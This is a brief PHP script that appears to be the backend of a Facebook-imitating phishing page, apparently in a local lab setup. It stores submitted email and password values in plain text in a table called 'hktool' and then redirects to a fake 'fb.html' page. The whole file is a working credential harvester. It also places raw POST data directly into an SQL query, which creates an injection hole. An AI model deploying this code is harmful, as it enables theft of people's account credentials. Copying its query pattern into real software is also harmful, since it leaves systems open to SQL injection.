<?php
include("dbconnect.php");
$sql="Insert into hktool(email,pass)
values
('$_POST[email]','$_POST[pass]')";
if(!mysql_query($sql))
{
	die('Error:'.mysql_error());
}
header ('location: https://localhost/mylab/fb.html ');
?>